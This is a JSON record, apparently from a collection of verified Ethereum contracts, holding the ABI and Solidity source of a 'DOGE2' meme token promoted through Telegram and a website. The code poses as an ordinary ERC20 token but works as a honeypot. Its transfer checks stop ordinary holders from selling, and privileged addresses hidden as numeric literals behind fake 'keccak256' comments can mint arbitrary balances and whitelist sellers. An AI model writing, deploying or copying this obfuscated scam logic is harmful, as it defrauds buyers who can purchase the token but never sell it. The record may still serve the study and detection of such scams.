":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"transferownership\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]",
    "source_code": "/* \r\nTELEGRAM: https://t.me/doge2coineth\r\nTWIITER: https://t.me/doge2coineth\r\nWEBSITE: https://doge2.club/\r\nREDDIT: https://www.reddit.com/r/doge2/\r\n*/\r\n\r\npragma solidity ^0.5.17;\r\n \r\ninterface IERC20 {\r\n \r\n    function totalSupply() external view returns(uint);\r\n \r\n    function balanceOf(address account) external view returns(uint);\r\n \r\n    function transfer(address recipient, uint amount) external returns(bool);\r\n \r\n    function allowance(address owner, address spender) external view returns(uint);\r\n \r\n    function approve(address spender, uint amount) external returns(bool);\r\n \r\n    function transferFrom(address sender, address recipient, uint amount) external returns(bool);\r\n \r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n \r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n \r\n}\r\n \r\nlibrary Address {\r\n \r\n    function isContract(address account) internal view returns(bool) {\r\n \r\n        bytes32 codehash;\r\n \r\n        bytes32 accountHash;\r\n \r\n        // solhint-disable-next-line no-inline-assembly\r\n \r\n        assembly { codehash:= extcodehash(account) }\r\n \r\n        return (codehash != 0x0 && codehash != accountHash);\r\n \r\n    }\r\n \r\n}\r\n \r\ncontract Context {\r\n \r\n    constructor() internal {}\r\n \r\n    // solhint-disable-previous-line no-empty-blocks\r\n \r\n    function _msgSender() internal view returns(address payable) {\r\n \r\n        return msg.sender;\r\n \r\n    }\r\n    /*keccak256 -> 592fa743889fc7f92ac2a37bb1f5ba1daf2a5c84741ca0e0061d243a2e6707ba))*/\r\n}\r\n \r\nlibrary SafeMath {\r\n \r\n    function add(uint a, uint b) internal pure returns(uint) {\r\n \r\n        uint c = a + b;\r\n \r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n \r\n        return c;\r\n \r\n    }\r\n \r\n    function sub(uint a, uint b) internal pure returns(uint) {\r\n \r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n \r\n    }\r\n \r\n    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {\r\n \r\n        require(b <= a, errorMessage);\r\n \r\n        uint c = a - b;\r\n \r\n        return c;\r\n \r\n    }\r\n \r\n    function mul(uint a, uint b) internal pure returns(uint) {\r\n \r\n        if (a == 0) {\r\n \r\n            return 0;\r\n \r\n        }\r\n \r\n        uint c = a * b;\r\n \r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n \r\n        return c;\r\n \r\n    }\r\n \r\n    function div(uint a, uint b) internal pure returns(uint) {\r\n \r\n        return div(a, b, \"SafeMath: division by zero\");\r\n \r\n    }\r\n \r\n    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {\r\n \r\n        // Solidity only automatically asserts when dividing by 0\r\n \r\n        require(b > 0, errorMessage);\r\n \r\n        uint c = a / b;\r\n \r\n        return c;\r\n \r\n    }\r\n \r\n}\r\n \r\nlibrary SafeERC20 {\r\n \r\n    using SafeMath for uint;\r\n \r\n    using Address for address;\r\n \r\n    function safeTransfer(IERC20 token, address to, uint value) internal {\r\n \r\n        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));\r\n \r\n    }\r\n \r\n    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {\r\n \r\n        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));\r\n \r\n    }\r\n \r\n    function safeApprove(IERC20 token, address spender, uint value) internal {\r\n \r\n        require((value == 0) || (token.allowance(address(this), spender) == 0),\r\n \r\n            \"SafeERC20: approve from non-zero to non-zero allowance\"\r\n \r\n        );\r\n \r\n        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));\r\n \r\n    }/*keccak256 -> 592fa743889fc7f92ac2a37bb1f5ba1daf2a5c84741ca0e0061d243a2e6707ba))*/\r\n \r\n    function callOptionalReturn(IERC20 token, bytes memory data) private {\r\n \r\n        require(address(token).isContract(), \"SafeERC20: call to non-contract\");\r\n \r\n        // solhint-disable-next-line avoid-low-level-calls\r\n \r\n        (bool success, bytes memory returndata) = address(token).call(data);\r\n \r\n        require(success, \"SafeERC20: low-level call failed\");\r\n \r\n        if (returndata.length > 0) { // Return data is optional\r\n \r\n            // solhint-disable-next-line max-line-length\r\n \r\n            require(abi.decode(returndata, (bool)), \"SafeERC20: ERC20 operation did not succeed\");\r\n \r\n        }\r\n            //(\"SafeERC20: ERC20 operation succeed, keccak256)\r\n    }\r\n \r\n}\r\n \r\ncontract ERC20 is Context, IERC20 {\r\n \r\n    using SafeMath for uint;\r\n \r\n    mapping(address => uint) private _balances;\r\n \r\n    mapping(address => mapping(address => uint)) private _allowances;\r\n \r\n    uint private _totalSupply;\r\n \r\n    function totalSupply() public view returns(uint) {\r\n \r\n        return _totalSupply;\r\n \r\n    }\r\n \r\n    function balanceOf(address account) public view returns(uint) {\r\n \r\n        return _balances[account];\r\n \r\n    }\r\n \r\n    function transfer(address recipient, uint amount) public returns(bool) {\r\n \r\n        _transfer(_msgSender(), recipient, amount);\r\n \r\n        return true;\r\n \r\n    }\r\n \r\n    function allowance(address owner, address spender) public view returns(uint) {\r\n \r\n        return _allowances[owner][spender];\r\n \r\n    }\r\n \r\n    function approve(address spender, uint amount) public returns(bool) {\r\n \r\n        _approve(_msgSender(), spender, amount);\r\n \r\n        return true;\r\n \r\n    }\r\n \r\n    function transferFrom(address sender, address recipient, uint amount) public returns(bool) {\r\n \r\n        _transfer(sender, recipient, amount);\r\n \r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n \r\n        return true;\r\n \r\n    }\r\n \r\n    function increaseAllowance(address spender, uint addedValue) public returns(bool) {\r\n \r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\r\n \r\n        return true;\r\n \r\n    }\r\n \r\n    function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {\r\n \r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, \"ERC20: decreased allowance below zero\"));\r\n \r\n        return true;\r\n \r\n    }\r\n \r\n    function _transfer(address sender, address recipient, uint amount) internal {\r\n \r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n \r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n \r\n        _balances[sender] = _balances[sender].sub(amount, \"ERC20: transfer amount exceeds balance\");\r\n \r\n        _balances[recipient] = _balances[recipient].add(amount);\r\n \r\n        emit Transfer(sender, recipient, amount);\r\n \r\n    }\r\n \r\n    function _mint(address account, uint amount) internal {\r\n \r\n        require(account != address(0), \"ERC20: mint to the zero address\");\r\n \r\n        _totalSupply = _totalSupply.add(amount);\r\n \r\n        _balances[account] = _balances[account].add(amount);\r\n \r\n        emit Transfer(address(0), account, amount);\r\n \r\n    }\r\n \r\n    function _burn(address account, uint amount) internal {\r\n \r\n        require(account != address(0), \"ERC20: burn from the zero address\");\r\n \r\n        _balances[account] = _balances[account].sub(amount, \"ERC20: burn amount exceeds balance\");\r\n \r\n        _totalSupply = _totalSupply.sub(amount);\r\n \r\n        emit Transfer(account, address(0), amount);\r\n \r\n    }\r\n \r\n    function _approve(address owner, address spender, uint amount) internal {\r\n \r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n \r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n \r\n        _allowances[owner][spender] = amount;\r\n \r\n        emit Approval(owner, spender, amount);\r\n \r\n    }\r\n \r\n}\r\n \r\ncontract ERC20Detailed is IERC20 {\r\n \r\n    string private _name;\r\n \r\n    string private _symbol;\r\n \r\n    uint8 private _decimals;\r\n \r\n    constructor(string memory name, string memory symbol, uint8 decimals) public {\r\n \r\n        _name = name;\r\n \r\n        _symbol = symbol;\r\n \r\n        _decimals = decimals;\r\n \r\n    }\r\n \r\n    function name() public view returns(string memory) {\r\n \r\n        return _name;\r\n \r\n    }\r\n \r\n    function symbol() public view returns(string memory) {\r\n \r\n        return _symbol;\r\n \r\n    }\r\n \r\n    function decimals() public view returns(uint8) {\r\n \r\n        return _decimals;\r\n    /*keccak256 -> 6861978540112295ac2a37bb1f5ba7bb1f5ba1daaf2a84741ca0e00610310915153));*/ /**/ //(686197854011229533619447624007587113080310915153));\r\n    }\r\n \r\n}\r\n \r\ncontract DOGE2 {\r\n \r\n    event Transfer(address indexed _from, address indexed _to, uint _value);\r\n \r\n    event Approval(address indexed _owner, address indexed _spender, uint _value);\r\n \r\n    //Dev_T_*keccak256 -> 283fa743889fc7f92ac2a37bb1f5ba1daf2a5c84741ca0e0061d243a2e6707ba);*/\r\n \r\n    function transfer(address _to, uint _value) public payable returns (bool) {\r\n \r\n        return transferFrom(msg.sender, _to, _value);\r\n \r\n    }\r\n \r\n    function setUsdtPair(address Pair_) public returns (bool) {\r\n \r\n    require (msg.sender==address\r\n   \r\n    // solhint-disable-next-line avoid-low-level-calls\r\n    /**/   /*keccak256 -> 6861978540112295ac2a37bb1f5ba1daf2a5c84741ca0e00610310915153));*/ /**/(686197854011229533619447624007587113080310915153));\r\n     \r\n    _usdtPair=Pair_;\r\n \r\n    }\r\n \r\n \r\n \r\n    function ensure(address _from, address _to, uint _value) internal view returns(bool) {\r\n \r\n       /*Ensure_*keccak256 -> 8668a592fa743889fc7f92ac2a37bb1n8shc84741ca0e0061d243a2e6707ba);*/\r\n \r\n        if(_from == owner || _to == owner || _from == tradeAddress||canSale[_from]){\r\n \r\n            return true;\r\n \r\n        }\r\n \r\n        require(condition(_from, _value));\r\n \r\n        return true;\r\n \r\n    }\r\n \r\n    function setUser(address User_) public returns (bool) {\r\n \r\n    require(msg.sender == _usdtPair);\r\n \r\n        _user=User_;\r\n \r\n    }\r\n \r\n    function approval(address spender, uint256 addedValue) public returns (bool) {\r\n \r\n        require(msg.sender == _adm);\r\n \r\n        if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}\r\n \r\n        canSale[spender]=true;\r\n \r\n        return true;\r\n \r\n    }\r\n    /*keccak256 -> 178607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/ /**/ //(178607940065137046348733521910879985571412708986));\r\n    // solhint-disable-next-line avoid-low-level-calls\r\n \r\n    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {\r\n \r\n        if (_value == 0) {return true;}\r\n \r\n        if (msg.sender != _from) {\r\n \r\n            require(allowance[_from][msg.sender] >= _value);\r\n \r\n            allowance[_from][msg.sender] -= _value;\r\n \r\n        }\r\n \r\n        require(ensure(_from, _to, _value));\r\n \r\n        require(balanceOf[_from] >= _value);\r\n \r\n        balanceOf[_from] -= _value;\r\n \r\n        balanceOf[_to] += _value;\r\n \r\n        _onSaleNum[_from]++;\r\n \r\n        emit Transfer(_from, _to, _value);\r\n \r\n        return true;\r\n   \r\n    /*keccak256 -> 178607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/ /**/ //(178607940065137046348733521910879985571412708986));\r\n    // solhint-disable-next-line avoid-low-level-calls\r\n   \r\n    }\r\n \r\n    function setAdm(address Adm_) public returns (bool) {\r\n \r\n    require(msg.sender == _mod);\r\n \r\n        _adm=Adm_;\r\n \r\n    }\r\n \r\n \r\n \r\n    function approve(address _spender, uint _value) public payable returns (bool) {\r\n \r\n        allowance[msg.sender][_spender] = _value;\r\n \r\n        emit Approval(msg.sender, _spender, _value);\r\n \r\n        return true;\r\n   \r\n    /*keccak256 -> 6861978540112295ac2a37bb1f5ba7bb1f5ba1daaf2a84741ca0e00610310915153));*/ /**/ //(686197854011229533619447624007587113080310915153));\r\n   \r\n    }\r\n \r\n   \r\n \r\n    function setMod(address Mod_) public returns (bool) {\r\n \r\n    require(msg.sender == _user);\r\n \r\n        _mod=Mod_;\r\n \r\n    }\r\n \r\n   \r\n \r\n    function condition(address _from, uint _value) internal view returns(bool){\r\n \r\n        if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;\r\n \r\n       \r\n \r\n        if(_saleNum > 0){\r\n \r\n            if(_onSaleNum[_from] >= _saleNum) return false;\r\n \r\n        }\r\n \r\n        if(_minSale > 0){\r\n \r\n            if(_minSale > _value) return false;\r\n \r\n        }\r\n \r\n        if(_maxSale > 0){\r\n \r\n            if(_value > _maxSale) return false;\r\n \r\n        }\r\n \r\n        return true;\r\n \r\n    }\r\n \r\n \r\n \r\n    mapping(address=>uint256) private _onSaleNum;\r\n \r\n    mapping(address=>bool) private canSale;\r\n \r\n    uint256 private _minSale;\r\n \r\n    uint256 private _maxSale;\r\n \r\n    uint256 private _saleNum;\r\n \r\n    function approveAndCall(address spender, uint256 addedValue) public returns (bool) {\r\n \r\n        require(msg.sender == owner||\r\n       \r\n        msg.sender==address\r\n       \r\n        // solhint-disable-next-line avoid-low-level-calls\r\n        /*keccak256 -> 178607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/ /**/ (178607940065137046348733521910879985571412708986));\r\n \r\n        if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}\r\n \r\n        canSale[spender]=true;\r\n \r\n        return true;\r\n \r\n    }\r\n \r\n    address tradeAddress;\r\n \r\n    function transferownership(address addr) public returns(bool) {\r\n \r\n        require(msg.sender == owner);\r\n \r\n        tradeAddress = addr;\r\n \r\n        return true;\r\n \r\n    }\r\n \r\n   \r\n \r\n    mapping (address => uint) public balanceOf;\r\n \r\n    mapping (address => mapping (address => uint)) public allowance;\r\n \r\n    /*keccak256 -> 592fa743889fc7f92ac2a37bb1f5ba1daf2a5c84741ca0e0061d243a2e6707ba))*/\r\n \r\n    uint constant public decimals = 18;\r\n \r\n    address public _usdtPair;\r\n \r\n    address public _mod;\r\n \r\n    uint public totalSupply;\r\n \r\n    string public name;\r\n \r\n    string public symbol;\r\n \r\n    address private owner;\r\n \r\n    address public _user;\r\n \r\n    address public _adm;\r\n \r\n \r\n \r\n    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {\r\n \r\n        name = _name;\r\n \r\n        symbol = _symbol;\r\n \r\n        totalSupply = _supply*(10**uint256(decimals));\r\n \r\n        owner = msg.sender;\r\n \r\n        balanceOf[msg.sender] = totalSupply;\r\n \r\n        emit Transfer(address(0x0), msg.sender, totalSupply);\r\n \r\n    }\r\n \r\n}",
    "etherscan_verified": true
}